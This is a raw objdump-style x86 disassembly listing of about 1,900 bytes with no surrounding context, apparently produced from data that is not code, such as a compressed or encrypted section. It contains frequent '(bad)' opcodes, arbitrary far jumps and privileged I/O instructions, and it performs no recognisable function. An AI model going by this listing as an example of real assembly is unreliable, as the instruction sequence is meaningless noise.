  4208d0:	add    BYTE PTR [ecx+0x7],ch
  4208d3:	or     eax,0xd41f27a5
  4208d8:	mov    esp,0xd7c46baa
  4208dd:	or     ecx,edi
  4208df:	loop   0x420862
  4208e1:	mov    ecx,0xbc2fb97c
  4208e6:	pop    esi
  4208e7:	push   edi
  4208e8:	adc    al,0xd2
  4208ea:	(bad)  
  4208eb:	xchg   ecx,eax
  4208ec:	into   
  4208ed:	(bad)  
  4208ee:	ds mov edi,0x8f178ff8
  4208f4:	xchg   ebx,eax
  4208f5:	jbe    0x4208a5
  4208f7:	sub    BYTE PTR [edx+0x221cfa32],0xb0
  4208fe:	test   eax,0x9fe38a40
  420903:	adc    al,0xff
  420905:	pop    es
  420906:	(bad)  ds:0xd1b33972
  42090c:	mov    esi,0x5c7ef166
  420911:	cs cs out 0xc2,al
  420915:	rcl    ah,1
  420917:	outs   dx,BYTE PTR ds:[esi]
  420918:	jp     0x4208cd
  42091a:	repz js 0x420942
  42091d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42091e:	push   ds
  42091f:	lahf   
  420920:	adc    bh,BYTE PTR [edi-0x27]
  420923:	retf   
  420924:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420925:	xchg   edx,eax
  420926:	push   0x6c1d19ae
  42092b:	mov    dl,0xa3
  42092d:	mov    al,ds:0x48a312e9
  420932:	xchg   edx,eax
  420933:	jns    0x420909
  420935:	pop    ebp
  420936:	cmp    ecx,DWORD PTR [ebp-0x49c15530]
  42093c:	pop    ds
  42093d:	out    0x3d,al
  42093f:	pop    ebx
  420940:	jae    0x420998
  420942:	imul   ecx,DWORD PTR [ebp-0x524fef1e],0x87c644b2
  42094c:	adc    al,0x96
  42094e:	xor    edi,esi
  420950:	xor    DWORD PTR [esi],ebp
  420952:	sbb    BYTE PTR [ecx],al
  420954:	inc    eax
  420955:	sub    DWORD PTR [edi-0x4a],edx
  420958:	fdivr  DWORD PTR ds:0x1daf950d
  42095e:	repnz cs leave 
  420961:	scas   eax,DWORD PTR es:[edi]
  420962:	retf   0x89ab
  420965:	mov    al,0x98
  420968:	xchg   esi,eax
  420969:	pusha  
  42096a:	pop    ecx
  42096b:	mov    edx,0xd4351df4
  420970:	repnz stos BYTE PTR es:[edi],al
  420972:	mov    WORD PTR [esi],ss
  420974:	cmp    DWORD PTR [esi],edi
  420976:	pusha  
  420977:	sbb    esi,DWORD PTR [edx-0x46a5a05a]
  42097d:	stc    
  42097e:	cmp    ch,ch
  420980:	enter  0xa8e7,0x68
  420984:	xchg   ebp,eax
  420985:	xlat   BYTE PTR ds:[ebx]
  420986:	fwait
  420987:	pop    esi
  420988:	iret   
  420989:	mov    cl,0x22
  42098b:	hlt    
  42098c:	call   0x8b95083
  420991:	sar    esp,cl
  420993:	and    bh,BYTE PTR [eax+0x7b]
  420996:	inc    esp
  420997:	jg     0x4209ef
  420999:	mov    edi,0x54ceb3cd
  42099e:	stos   DWORD PTR es:[edi],eax
  42099f:	(bad)  
  4209a0:	rol    BYTE PTR [eax+0x2f],1
  4209a3:	aad    0xd1
  4209a5:	pushf  
  4209a6:	jmp    0x420958
  4209a8:	lock or ah,BYTE PTR ds:0xb2033556
  4209af:	fld    st(5)
  4209b1:	push   ds
  4209b2:	(bad)  
  4209b3:	call   0x5efc8d58
  4209b8:	out    0xbf,eax
  4209ba:	imul   ebp
  4209bc:	mov    bl,0x88
  4209be:	fs pop eax
  4209c0:	jmp    0x420943
  4209c2:	xlat   BYTE PTR ds:[ebx]
  4209c3:	enter  0xb56,0x9
  4209c7:	sub    edx,DWORD PTR [edi]
  4209c9:	mov    ch,0xf9
  4209cb:	pop    edx
  4209cc:	sti    
  4209cd:	jge    0x4209d2
  4209cf:	or     bh,BYTE PTR [ebx+0x1099b6eb]
  4209d5:	retf   0xfa2a
  4209d8:	mov    bl,0x82
  4209da:	lahf   
  4209db:	ss test eax,0x663b43bf
  4209e1:	mov    bh,BYTE PTR [esi]
  4209e3:	icebp  
  4209e4:	and    DWORD PTR [ecx],edx
  4209e6:	mov    esp,0xa749e625
  4209eb:	out    dx,eax
  4209ec:	and    bh,0x40
  4209ef:	xchg   edx,eax
  4209f0:	push   edi
  4209f1:	aaa    
  4209f2:	retf   0x25b1
  4209f5:	pop    edi
  4209f6:	and    dh,ah
  4209f8:	dec    ecx
  4209f9:	aas    
  4209fa:	inc    ecx
  4209fb:	sbb    BYTE PTR [esi-0x32],al
  4209fe:	lock popf 
  420a00:	jmp    0xa6e:0x4ea21f50
  420a07:	out    0x9d,al
  420a09:	ror    edi,0xbc
  420a0c:	xchg   ebx,eax
  420a0d:	not    al
  420a0f:	push   ebx
  420a10:	or     BYTE PTR [ebp+0x619ca52d],bh
  420a16:	mov    al,ds:0xdbcb7ae
  420a1b:	(bad)  
  420a1c:	ja     0x420a41
  420a1e:	retf   0x560e
  420a21:	mov    al,ds:0x418cbe75
  420a26:	inc    ebp
  420a27:	shl    ch,0x92
  420a2a:	in     al,dx
  420a2b:	loop   0x420a01
  420a2d:	push   es
  420a2e:	ja     0x4209fe
  420a30:	imul   edx,DWORD PTR [ebx+0x62],0xffffff8b
  420a34:	mov    al,0xa9
  420a36:	pop    esi
  420a37:	and    ebp,DWORD PTR [esi-0x49]
  420a3a:	sub    DWORD PTR fs:[eax],0xd
  420a3e:	adc    eax,0xaefba705
  420a43:	add    al,0x1
  420a45:	daa    
  420a46:	dec    ebx
  420a47:	jl     0x420a5f
  420a49:	add    dh,dh
  420a4b:	xor    edx,DWORD PTR [edx+0x45703733]
  420a51:	cmp    bh,BYTE PTR [edi+edx*2+0x5f78fd5c]
  420a58:	mov    al,0x62
  420a5a:	test   DWORD PTR [ebp+0x3a],ebp
  420a5d:	push   edx
  420a5e:	mov    cl,0xb3
  420a60:	into   
  420a61:	mov    bl,0x58
  420a63:	jns    0x420a7c
  420a65:	nop
  420a66:	jl     0x420a78
  420a68:	ds call 0x6adc:0x2d6c7674
  420a70:	jecxz  0x420a7e
  420a72:	jge    0x420abd
  420a74:	add    esp,DWORD PTR [edi+0x10]
  420a77:	inc    ebx
  420a78:	mov    ds:0xe5f8ba7c,al
  420a7d:	and    DWORD PTR [ebp+0x75],edi
  420a80:	push   0x6f
  420a82:	xchg   esp,eax
  420a83:	lock mov esp,0xec95bf77
  420a89:	dec    ebx
  420a8a:	sti    
  420a8b:	sub    edi,DWORD PTR ds:0x192af4ae
  420a91:	cwde   
  420a92:	lock pop esi
  420a94:	out    dx,al
  420a95:	mul    BYTE PTR [ebp-0xf]
  420a98:	fstp   QWORD PTR [ebx+ebp*8]
  420a9b:	aaa    
  420a9c:	arpl   WORD PTR [ebx+ecx*2],ax
  420a9f:	dec    esp
  420aa0:	pop    ebx
  420aa1:	mov    dl,0xe0
  420aa3:	lods   eax,DWORD PTR ds:[esi]
  420aa4:	out    0x6f,al
  420aa6:	daa    
  420aa7:	jb     0x420ad4
  420aa9:	fs stos BYTE PTR es:[edi],al
  420aab:	sti    
  420aac:	pop    eax
  420aad:	into   
  420aae:	cld    
  420aaf:	fiadd  WORD PTR [edi-0x2015ce4b]
  420ab5:	or     eax,0x66b16150
  420aba:	repz push ss
  420abc:	push   cs
  420abd:	out    0xab,eax
  420abf:	inc    esp
  420ac0:	mov    esi,0x3ea48574
  420ac5:	hlt    
  420ac6:	xor    al,0xa1
  420ac8:	inc    ebx
  420ac9:	into   
  420aca:	scas   eax,DWORD PTR es:[edi]
  420acb:	mov    DWORD PTR [ebx],0x745c9a3f
  420ad1:	enter  0xdb33,0xce
  420ad5:	mov    BYTE PTR [edx+eiz*2+0x12657f4a],cl
  420adc:	call   0x994bc77e
  420ae1:	es int 0x16
  420ae4:	ret    0x3b5
  420ae7:	(bad)  
  420ae8:	or     ebp,DWORD PTR [eax]
  420aea:	popf   
  420aeb:	(bad)  
  420aec:	rcl    DWORD PTR [edx],cl
  420aee:	inc    ebx
  420aef:	cmp    edi,eax
  420af1:	push   esi
  420af2:	xchg   edi,eax
  420af3:	call   0x82a27ae8
  420af8:	xchg   ecx,eax
  420af9:	test   DWORD PTR ds:0x5cf9ab73,esp
  420aff:	int    0x14
  420b01:	and    cl,BYTE PTR ds:0x5494e30
  420b07:	ror    DWORD PTR [ecx+0x7110a4a6],0x95
  420b0e:	sub    al,0x4
  420b10:	xchg   edx,eax
  420b11:	mov    ecx,0x8b820600
  420b16:	sub    ecx,esi
  420b18:	dec    esp
  420b19:	mov    edi,0x7feb511d
  420b1e:	or     al,dl
  420b20:	ds ja  0x420af9
  420b23:	mov    ds:0x4f087b3a,al
  420b28:	sti    
  420b29:	popf   
  420b2a:	and    eax,DWORD PTR [ecx]
  420b2c:	iret   
  420b2d:	inc    DWORD PTR ds:0x2b4c6cc3
  420b33:	mov    al,ds:0x46053ddf
  420b38:	xor    esi,DWORD PTR [ecx-0x14]
  420b3b:	jmp    0xf953:0x1e567f69
  420b42:	fdiv   DWORD PTR [eax]
  420b44:	pop    edx
  420b45:	fidiv  DWORD PTR [edx-0xc332221]
  420b4b:	out    dx,eax
  420b4c:	push   es
  420b4d:	(bad)
  420b50:	call   0xf407:0x8abc5d2
  420b57:	lahf   
  420b58:	in     eax,dx
  420b59:	pop    ds
  420b5a:	xchg   edi,eax
  420b5b:	mov    bl,0x99
  420b5d:	mov    dh,0xd7
  420b5f:	fidiv  DWORD PTR [ebx]
  420b61:	push   ds
  420b62:	jae    0x420b4b
  420b64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420b65:	ficomp WORD PTR [ebx-0x22]
  420b68:	push   edx
  420b69:	inc    edi
  420b6a:	icebp  
  420b6b:	sbb    al,BYTE PTR [edx]
  420b6d:	cwde   
  420b6e:	push   cs
  420b6f:	xchg   esp,eax
  420b70:	xchg   ebp,eax
  420b71:	jmp    0x7bd2:0x43eaf56f
  420b78:	sbb    ch,dl
  420b7a:	add    eax,0xb419d3b7
  420b7f:	aad    0xc1
  420b81:	iret   
  420b82:	rol    BYTE PTR [ebp+0x7af37ace],0xeb
  420b89:	dec    ebp
  420b8a:	push   esp
  420b8b:	cmp    al,0x1e
  420b8d:	je     0x420b50
  420b8f:	dec    ecx
  420b90:	and    al,0x4f
  420b92:	and    bl,BYTE PTR [ecx]
  420b94:	repz inc eax
  420b96:	daa    
  420b97:	jle    0x420ba7
  420b99:	idiv   BYTE PTR [esi]
  420b9b:	pop    edi
  420b9c:	sbb    eax,0x5b640e24
  420ba1:	push   ds
  420ba2:	je     0x420bb0
  420ba4:	push   ebp
  420ba5:	in     eax,0xc3
  420ba7:	icebp  
  420ba8:	adc    BYTE PTR [edi-0x6c],bh
  420bab:	stos   BYTE PTR es:[edi],al
  420bac:	xchg   ecx,eax
  420bad:	mov    eax,0xdb67fb11
  420bb2:	popf   
  420bb3:	adc    eax,edx
  420bb5:	cs pop ecx
  420bb7:	ficom  WORD PTR [esi]
  420bb9:	(bad)  [eax+0x1957b081]
  420bbf:	ins    DWORD PTR es:[edi],dx
  420bc0:	test   al,0xab
  420bc2:	test   eax,0x30b890e0
  420bc7:	push   ss
  420bc8:	std    
  420bc9:	fcmove st,st(7)
  420bcb:	sar    edi,1
  420bcd:	jp     0x420c3d
  420bcf:	inc    edi
  420bd0:	push   0x1557164b
  420bd5:	jecxz  0x420bcd
  420bd7:	cld    
  420bd8:	xchg   BYTE PTR [eax-0x4eaff5f],bl
  420bde:	(bad)  
  420bdf:	hlt    
  420be0:	cmp    DWORD PTR [ebp-0x1e2c43ca],esi
  420be6:	or     ch,BYTE PTR [eax]
  420be8:	push   ebx
  420be9:	xchg   ebp,eax
  420bea:	or     esi,DWORD PTR [ebx-0x6f985e61]
  420bf0:	push   ss
  420bf1:	aaa    
  420bf2:	sar    DWORD PTR [ebx-0x1fd38492],0x2c
  420bf9:	icebp  
  420bfa:	or     ebx,esi
  420bfc:	add    DWORD PTR [esi-0x34],ebp
  420bff:	icebp  
  420c00:	shr    BYTE PTR [edi-0x224a2329],cl
  420c06:	enter  0xa69d,0x9e
  420c0a:	jae    0x420c68
  420c0c:	sub    bh,BYTE PTR [ebp+0x79]
  420c0f:	cmp    al,0x47
  420c11:	mov    cl,0x49
  420c13:	sbb    ebx,DWORD PTR [ebp-0x3b]
  420c16:	es (bad) 
  420c18:	xor    ax,0xccd4
  420c1c:	adc    ecx,DWORD PTR [ecx-0x10928702]
  420c22:	jmp    0x420bc5
  420c24:	cs inc esp
  420c26:	cmp    bl,BYTE PTR [esi]
  420c28:	sub    dh,BYTE PTR [ebx]
  420c2a:	xor    DWORD PTR [edi-0x6212b2d2],edx
  420c30:	push   0x4f
  420c32:	call   0x196d4d9c
  420c37:	iret   
  420c38:	retf   0x71ee
  420c3b:	mov    esp,0xc6ff07bd
  420c40:	adc    al,0x11
  420c42:	scas   al,BYTE PTR es:[edi]
  420c43:	sbb    DWORD PTR [edx],esp
  420c45:	mov    ch,0x68
  420c47:	mov    eax,0xa89fceeb
  420c4c:	xchg   esi,eax
  420c4d:	sti    
  420c4e:	mov    edx,0x72b7dfa4
  420c53:	adc    ch,BYTE PTR [ebp-0x36]
  420c56:	sbb    DWORD PTR [edx+0x30],esp
  420c59:	mov    dh,0xc6
  420c5b:	sti    
  420c5c:	into   
  420c5d:	inc    edx
  420c5e:	xlat   BYTE PTR ds:[ebx]
  420c5f:	dec    ecx
  420c60:	sub    BYTE PTR [ecx+0x1b5b9ac5],0x5c
  420c67:	out    0xb1,eax
  420c69:	jno    0x420cc8
  420c6b:	into   
  420c6c:	add    DWORD PTR [esi+0x5b],edi
  420c6f:	stos   BYTE PTR es:[edi],al
  420c70:	jae    0x420c67
  420c72:	mov    al,fs:0xa294b859
  420c78:	cmp    esp,DWORD PTR [eax+0x18b2903e]
  420c7e:	pop    eax
  420c7f:	out    0x1a,al
  420c81:	es sub eax,ebp
  420c84:	cwde   
  420c85:	stos   BYTE PTR es:[edi],al
  420c86:	addr16 ret 
  420c88:	sub    cl,ah
  420c8a:	sub    al,bh
  420c8c:	pusha  
  420c8d:	inc    edi
  420c8e:	sub    edx,DWORD PTR [esi+0xf]
  420c91:	stc    
  420c92:	pop    es
  420c93:	popf   
  420c94:	dec    eax
  420c95:	xor    al,0xee
  420c97:	dec    esi
  420c98:	retf   
  420c99:	pop    ss
  420c9a:	jmp    0x8bbf9874
  420c9f:	adc    al,0x1e
  420ca1:	bound  esi,QWORD PTR [ebx-0x1cacb4e4]
  420ca7:	adc    eax,0x40c0d833
  420cac:	adc    cl,dh
  420cae:	pop    ebp
  420caf:	(bad)
  420cb3:	add    al,BYTE PTR [eax+0x578afc3e]
  420cb9:	es retf 
  420cbb:	sub    DWORD PTR [eax-0x4e],esp
  420cbe:	out    dx,al
  420cbf:	pusha  
  420cc0:	or     al,0xe1
  420cc2:	cli    
  420cc3:	repnz push edx
  420cc5:	mov    cl,0x38
  420cc7:	mov    eax,ds:0x74241e34
  420ccc:	pop    ds
  420ccd:	lock mov ebp,0x4922c9e2
  420cd3:	xor    DWORD PTR [edi-0x8],0xd
  420cd7:	inc    ebp
  420cd8:	push   ecx
  420cd9:	sbb    bl,BYTE PTR [ecx]
  420cdb:	sbb    esi,DWORD PTR [ecx+0x770f1aa7]
  420ce1:	icebp  
  420ce2:	sar    BYTE PTR [ebx+0x68285f2f],1
  420ce8:	test   BYTE PTR [eax-0x63b41fa3],0xb4
  420cef:	imul   esi,esi,0x9696a53
  420cf5:	jae    0x420cd6
  420cf7:	(bad)  
  420cf9:	or     eax,0x70b143fb
  420cfe:	mov    esp,0x38e8d003
  420d03:	(bad)  
  420d04:	pop    ecx
  420d05:	lea    esp,[esi+edx*1]
  420d08:	xchg   BYTE PTR [ecx+0x22],ah
  420d0b:	js     0x420d64
  420d0d:	test   eax,0x31b89156
  420d12:	or     al,BYTE PTR [edi]
  420d14:	or     BYTE PTR [eax-0x49e90023],bh
  420d1a:	aam    0x4d
  420d1c:	sbb    eax,0x89d48896
  420d21:	sbb    dl,bh
  420d23:	xchg   esp,eax
  420d24:	add    BYTE PTR [eax-0x4c7dbdda],bl
  420d2a:	xlat   BYTE PTR ds:[ebx]
  420d2b:	das    
  420d2c:	fnstcw WORD PTR [eax]
  420d2e:	sub    eax,0xddc7431e
  420d33:	out    dx,eax
  420d34:	or     edi,DWORD PTR [eax+0x4f]
  420d37:	jae    0x420d77
  420d39:	jbe    0x420d39
  420d3b:	ins    BYTE PTR es:[edi],dx
  420d3c:	(bad)  
  420d3e:	xor    dl,ch
  420d40:	nop
  420d41:	retf   
  420d42:	retf   0x7fa7
  420d45:	iret   
  420d46:	call   DWORD PTR [edx+0x38]
  420d49:	and    al,0xec
  420d4b:	ins    BYTE PTR es:[edi],dx
  420d4c:	shl    esp,0xfd
  420d4f:	call   0xa411:0x5e367d17
  420d56:	add    ecx,DWORD PTR ds:0x64501b8a
  420d5c:	xchg   esi,eax
  420d5d:	pop    ss
  420d5e:	mov    dl,BYTE PTR [esi+edx*1]
  420d61:	bound  edx,QWORD PTR [esp+eax*8+0xb93f071]
  420d68:	xlat   BYTE PTR ds:[ebx]
  420d69:	dec    edi
  420d6a:	sti    
  420d6b:	cmp    BYTE PTR [edx-0x46],dl
  420d6e:	xchg   edi,eax
  420d6f:	jmp    0x420d28
  420d71:	stos   BYTE PTR es:[edi],al
  420d72:	(bad)
  420d76:	rcl    ebx,0xd
  420d79:	scas   al,BYTE PTR es:[edi]
  420d7a:	ss pop eax
  420d7c:	dec    esi
  420d7d:	push   ss
  420d7e:	and    DWORD PTR [ebx+0x73b14645],ebx
  420d84:	and    al,0xf8
  420d86:	and    eax,0x883661c4
  420d8b:	jmp    0x5ec5:0x5c150095
  420d92:	into   
  420d93:	cmp    al,0x3a
  420d95:	xor    DWORD PTR [esi+0x20],ecx
  420d98:	mov    DWORD PTR [ecx+edi*4],esp
  420d9b:	(bad)  
  420d9c:	jbe    0x420d7e
  420d9e:	jge    0x420dcd
  420da0:	fnstenv [edi]
  420da2:	pop    ss
  420da3:	adc    dl,BYTE PTR [eax-0x3f]
  420da6:	out    0x9d,eax
  420da8:	sbb    eax,0xc32f4ad2
  420dad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420dae:	leave  
  420daf:	xchg   edx,eax
  420db0:	and    dl,BYTE PTR [eax-0x63]
  420db3:	fxch   st(0)
  420db5:	retf   
  420db6:	mov    al,BYTE PTR [eax+0x78]
  420db9:	pop    ss
  420dba:	mov    bl,0xa2
  420dbc:	pop    edx
  420dbd:	jle    0x420e2d
  420dbf:	cmp    cl,BYTE PTR [ebp-0x7c]
  420dc2:	pop    edi
  420dc3:	pushf  
  420dc4:	(bad)  
  420dc5:	lds    edx,FWORD PTR [eax-0x57]
  420dc8:	and    al,0x3d
  420dca:	pop    eax
  420dcb:	pop    edx
  420dcc:	shl    BYTE PTR [eax],cl
  420dce:	mov    DWORD PTR [ebx],0x4d844938
  420dd4:	xor    ch,BYTE PTR cs:[edi]
  420dd7:	inc    edi
  420dd8:	mov    al,0x4c
  420dda:	adc    al,0xa5
  420ddc:	hlt    
  420ddd:	fisub  WORD PTR [eax-0x71]
  420de0:	cwde   
  420de1:	mov    cl,0x46
  420de3:	xchg   ecx,eax
  420de4:	or     al,0x41
  420de6:	(bad)  
  420de7:	addr16 xor eax,0xe02a75ba
  420ded:	rcr    BYTE PTR [esi+0x1b6244fc],0x32
  420df4:	pop    eax
  420df5:	out    0x60,al
  420df7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420df8:	imul   ebp,esp,0x4887afa7
  420dfe:	adc    BYTE PTR [ebx-0x428cba69],ah
  420e04:	sar    BYTE PTR [ecx-0x5e],1
  420e07:	mov    dl,0x50
  420e09:	lods   eax,DWORD PTR ds:[esi]
  420e0a:	out    dx,eax
  420e0b:	mov    BYTE PTR [esi+0x2f],dh
  420e0e:	pop    ss
  420e0f:	mov    ds:0x6528477f,al
  420e14:	mov    eax,0xa80fe7f3
  420e19:	pop    edx
  420e1a:	jmp    0x429a4b4a
  420e1f:	fild   DWORD PTR [eax]
  420e21:	jmp    ebp
  420e23:	aaa    
  420e24:	adc    ecx,ebx
  420e26:	mov    ds:0xe8ed1338,eax
  420e2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420e2c:	cdq    
  420e2d:	sub    cl,dh
  420e2f:	jle    0x420e0e
  420e31:	rol    esi,0xb3
  420e34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420e35:	fstp   QWORD PTR [edi]
  420e37:	push   ds
  420e38:	loope  0x420e51
  420e3a:	(bad)  
  420e3b:	pmaxsw mm2,QWORD PTR [esi-0x11]
  420e3f:	xor    al,0xa4
  420e41:	push   ecx
  420e42:	mov    gs,WORD PTR [ebx]
  420e44:	mov    dh,0x1d
  420e46:	mov    dl,0x5a
  420e48:	in     al,dx
  420e49:	push   ecx
  420e4a:	shl    dh,cl
  420e4c:	cmp    dh,BYTE PTR ds:0xd262ee63
  420e52:	cmp    esp,eax
  420e54:	pop    ss
  420e55:	lea    eax,[eax-0x33]
  420e58:	dec    ebp
  420e59:	dec    ecx
  420e5a:	inc    edi
  420e5b:	lock stos BYTE PTR es:[edi],al
  420e5d:	mov    ds:0xe6a15b06,eax
  420e62:	cld    
  420e63:	pop    ebp
  420e64:	imul   edi,esp,0x58fd93da
  420e6a:	mov    gs:0xd7f38a8,al
  420e70:	fs clc 
  420e72:	(bad)  
  420e73:	mov    esi,0x41fac3a6
  420e78:	cli    
  420e79:	dec    edx
  420e7a:	adc    DWORD PTR [ebx-0x25330b10],0x23655225
  420e84:	cs stos BYTE PTR es:[edi],al
  420e86:	aaa    
  420e87:	mov    edx,0x78f7bda0
  420e8c:	das    
  420e8d:	pop    ebp
  420e8e:	cmp    ebx,DWORD PTR [esi]
  420e90:	cwde   
  420e91:	mov    dh,0x6b
  420e93:	jae    0x420e7e
  420e95:	and    edi,DWORD PTR [ebx-0x5a3ffb0]
  420e9b:	and    DWORD PTR [edi+0x3c23dc3c],edi
  420ea1:	stos   DWORD PTR es:[edi],eax
  420ea2:	push   ebp
  420ea3:	pop    ebp
  420ea4:	dec    ecx
  420ea5:	xchg   esp,eax
  420ea6:	sub    eax,0x64f2b2dc
  420eab:	and    eax,0xf30af240
  420eb0:	and    cl,0xbb
  420eb3:	push   eax
  420eb4:	push   edx
  420eb5:	and    DWORD PTR [esi+ebp*4-0x5486e796],ebx
  420ebc:	call   0x86af:0xa00d2c0a
  420ec3:	dec    edi
  420ec4:	inc    ecx
  420ec5:	mov    ds:0x3b7d8311,al
  420eca:	call   0xedef25b2
  420ecf:	xchg   esi,eax
  420ed0:	xor    ch,BYTE PTR [esi]
  420ed2:	push   0x7b37ccd6
  420ed7:	fs jbe 0x420ed6
  420eda:	pop    edx
  420edb:	xchg   ebx,eax
  420edc:	inc    edi
  420edd:	test   ah,dl
  420edf:	xor    dh,ah
  420ee1:	fld    QWORD PTR ds:0xbcca3375
  420ee7:	pusha  
  420ee8:	dec    esp
  420ee9:	xchg   edi,eax
  420eea:	jmp    0x420e7f
  420eec:	adc    esp,DWORD PTR [eax-0x5c]
  420eef:	daa    
  420ef0:	jmp    0x420f2b
  420ef2:	ficom  WORD PTR [ecx+esi*2-0xf]
  420ef6:	addr16 xchg ecx,eax
  420ef8:	push   edx
  420ef9:	push   ecx
  420efa:	dec    edx
  420efb:	pushf  
  420efc:	xor    DWORD PTR [edi+0x54c40675],esi
  420f02:	sbb    cl,BYTE PTR gs:[ebx+esi*4]
  420f06:	cs mov ecx,0x20a58ab6
  420f0c:	jb     0x420ef4
  420f0e:	imul   ebx,esi,0x6226c778
  420f14:	pusha  
  420f15:	js     0x420f57
  420f17:	mov    ?,esp
  420f19:	fstp   QWORD PTR [esi]
  420f1b:	push   ecx
  420f1c:	bound  esp,QWORD PTR [edx-0x70]
  420f1f:	cmp    dh,BYTE PTR [ebp+0x24f16cd7]
  420f25:	lock test al,0x72
  420f28:	imul   BYTE PTR [ecx-0x673901ee]
  420f2e:	pop    esp
  420f2f:	int3   
  420f30:	fcmovbe st,st(1)
  420f32:	or     edx,DWORD PTR [esi+edi*1-0x7e]
  420f36:	rol    DWORD PTR [esp+ebx*2+0x31],1
  420f3a:	(bad)  
  420f3b:	cmp    DWORD PTR [ebx+0x1d],ecx
  420f3e:	xchg   ebp,eax
  420f3f:	fcom   QWORD PTR [ebx+0x75]
  420f42:	ror    esi,0xa2
  420f45:	push   0x6de2f93c
  420f4a:	cmp    ecx,DWORD PTR [edi-0x2d]
  420f4d:	push   es
  420f4e:	xor    ebp,DWORD PTR [esi+0x184a58aa]
  420f54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420f56:	mov    bl,0x2e
  420f58:	or     esp,DWORD PTR [edx+0x1795e135]
  420f5e:	xor    BYTE PTR [ebp+eiz*8+0x7670fbd9],0x9b
  420f66:	sbb    al,ch
  420f68:	loopne 0x420f3c
  420f6a:	xor    BYTE PTR [eax-0x5],dh
  420f6d:	cmp    bh,BYTE PTR [ebx]
  420f6f:	mov    DWORD PTR [esi-0x37],esp
  420f72:	push   esp
  420f73:	popf   
  420f74:	dec    ebx
  420f75:	push   0x6c
  420f77:	dec    esp
  420f78:	and    al,0xb0
  420f7a:	outs   dx,BYTE PTR ds:[esi]
  420f7b:	push   esi
  420f7c:	mov    dl,0x52
  420f7e:	std    
  420f7f:	mov    al,ds:0x6e3f0b5c
  420f84:	ret    
  420f85:	fs enter 0xf414,0xed
  420f8a:	aam    0x53
  420f8c:	pop    ebp
  420f8d:	inc    ebx
  420f8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420f8f:	inc    esp
  420f90:	mov    cl,bl
  420f92:	xchg   ebp,eax
  420f93:	sbb    ebx,DWORD PTR [edx-0x67]
  420f96:	sub    al,0x17
  420f98:	or     eax,0x1708da66
  420f9d:	push   ds
  420f9e:	fistp  DWORD PTR [esi-0x5efc3bfc]
  420fa4:	cmp    dl,BYTE PTR [ecx]
  420fa6:	leave  
  420fa7:	pop    esi
  420fa8:	and    al,0x53
  420faa:	or     al,0x95
  420fac:	cld    
  420fad:	js     0x420fab
  420faf:	das    
  420fb0:	xchg   ebx,eax
  420fb1:	xchg   edi,eax
  420fb2:	lock and bh,BYTE PTR [edx+0x8]
  420fb6:	je     0x420fae
  420fb8:	pop    es
  420fb9:	aam    0xfd
  420fbb:	mov    bh,0xd1
  420fbd:	scas   al,BYTE PTR es:[edi]
  420fbe:	ins    DWORD PTR es:[edi],dx
  420fbf:	lahf   
  420fc0:	xchg   ebx,eax
  420fc1:	in     eax,dx
  420fc2:	pop    ss
  420fc3:	fnsave [ecx]
  420fc5:	jg     0x420f84
  420fc7:	push   esi
  420fc8:	stos   DWORD PTR es:[edi],eax
  420fc9:	stos   DWORD PTR es:[edi],eax
  420fca:	jmp    0x57f4:0xb04cd060
  420fd1:	stc    
  420fd2:	stos   DWORD PTR es:[edi],eax
  420fd3:	push   ss
  420fd4:	rcl    edi,0x53
  420fd7:	sub    ebp,DWORD PTR [edi]
  420fd9:	add    esi,DWORD PTR [edx]
  420fdb:	pop    esi
  420fdc:	aad    0xdd
  420fde:	scas   al,BYTE PTR es:[edi]
  420fdf:	int    0xdb
  420fe1:	(bad)  
  420fe2:	scas   eax,DWORD PTR es:[edi]
  420fe3:	push   0x47505ffb
  420fe8:	or     DWORD PTR [edi-0x179c5c77],edx
  420fee:	repz push 0x30
  420ff1:	lds    ebx,FWORD PTR [ebp+0x51f6c137]
  420ff7:	fwait
  420ff8:	(bad)  
  420ff9:	stc    
  420ffa:	in     al,dx
  420ffb:	xor    ch,ch
  420ffd:	stos   DWORD PTR es:[edi],eax
  420ffe:	addr16 mov bh,0x85
  421001:	mov    al,ds:0xd9f5c857
  421006:	sub    eax,DWORD PTR [ebx+0x44]
  421009:	nop
  42100a:	sub    eax,0x596bcbca
  42100f:	dec    edx
  421010:	jge    0x420fc6
  421012:	mov    edi,0xf18d99af
  421017:	icebp  
  421018:	jecxz  0x421095
  42101a:	cmp    ah,BYTE PTR [eax+0x7f]
  42101d:	inc    ecx
  42101e:	test   BYTE PTR [eax+0x54],ch
  421021:	lds    edi,FWORD PTR [eax-0x792719d3]
  421027:	repnz cld 
  421029:	jp     0x42106d
  42102b:	pusha  
  42102c:	out    dx,eax
  42102d:	fmul   DWORD PTR [eax]
  42102f:	mov    bl,ch
  421031:	int    0x4e
  421033:	icebp  
  421034:	jg     0x42107a
  421036:	or     edi,ecx
  421038:	aas    
  421039:	lods   al,BYTE PTR ds:[esi]
  42103a:	aad    0x1a
  42103c:	and    edi,DWORD PTR [esi-0x10]
  42103f:	adc    DWORD PTR [edx+0x1a],edx
  421042:	mov    eax,ds:0xbccb596c
  421047:	adc    al,0x1e
  421049:	add    BYTE PTR [eax+0x3cf003d2],dl
  42104f:	(bad)  
  421050:	ins    DWORD PTR es:[edi],dx
  421051:	mov    al,0x5e
  421053:	jbe    0x4210ab
  421055:	push   ds
  421056:	out    0x14,al
  421058:	fldcw  WORD PTR [ecx-0x41]
  42105b:	cli    
  42105c:	ins    DWORD PTR es:[edi],dx
  42105d:	jne    0x4210be
  42105f:	mov    al,0xf3
  421061:	xlat   BYTE PTR ds:[ebx]
  421062:	nop
  421063:	stos   BYTE PTR es:[edi],al
  421064:	adc    DWORD PTR [edi],esi
  421066:	inc    edi
  421067:	je     0x421032
  421069:	adc    al,0xe3
  42106b:	jno    0x421084
  42106d:	pop    es
  42106e:	dec    ebp
  42106f:	test   al,ch
  421071:	aam    0xc2
  421073:	jecxz  0x421054
  421075:	in     eax,0x31
  421077:	sub    BYTE PTR [edx-0x14d42c7b],bh
  42107d:	add    al,0x3a
  42107f:	push   0x29
